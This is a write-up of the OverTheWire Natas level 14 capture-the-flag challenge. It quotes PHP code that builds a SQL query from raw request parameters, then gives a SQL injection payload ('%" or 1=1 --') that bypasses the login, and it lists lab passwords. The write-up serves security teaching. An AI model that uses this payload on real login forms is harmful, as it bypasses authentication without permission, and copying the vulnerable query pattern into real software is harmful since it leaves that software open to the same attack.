# Natas Level 14

```bash
Username: natas14
Password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
URL:      http://natas14.natas.labs.overthewire.org
```
We enter the site, and see the following page:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas14.png" />
    <div align="center">Natas 14</div>
</figure>

Clicking on the "View sourcecode" link:
<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas14-view-sourcecode.png" />
    <div align="center">Natas 14 - View sourcecode</div>
</figure>

And the script is:
```php
if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas14', '<censored>'); 
    mysql_select_db('natas14', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    if(mysql_num_rows(mysql_query($query, $link)) > 0) { 
        echo "Successful login! The password for natas15 is <censored><br>"; 
    } else { 
        echo "Access denied!<br>"; 
    } 
    mysql_close($link); 
}
```

What's going on here? the script is connecting to the mysql server (*mysql_connect*), and selects the natas14 database (*mysql_select_db*).
After that, the following SQL query is being executed:
```sql
SELECT * from users where username= . $_REQUEST["username"] . and password= . $_REQUEST["password"]
```

If some rows are being retured, the password to the next level is being echoed as well.

We should use here [SQL injection](https://en.wikipedia.org/wiki/SQL_injection).

Lets assume we send the following as the "username" parameter:
```sql
%" or 1=1 -- 
```

The result query will be:

```sql
SELECT * from users where username="%" or 1=1 -- and password= . $_REQUEST["password"]
```

We just ignore the password checking and selecting all rows (1=1 always). We get:

<figure>
    <img src="https://raw.githubusercontent.com/sefi-roee/CTFs-Writeups/master/OverTheWire/Natas/images/natas13-success-login.png" />
    <div align="center">Natas 14 - SQL injection</div>
</figure>

We got the password for the next level: **AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J**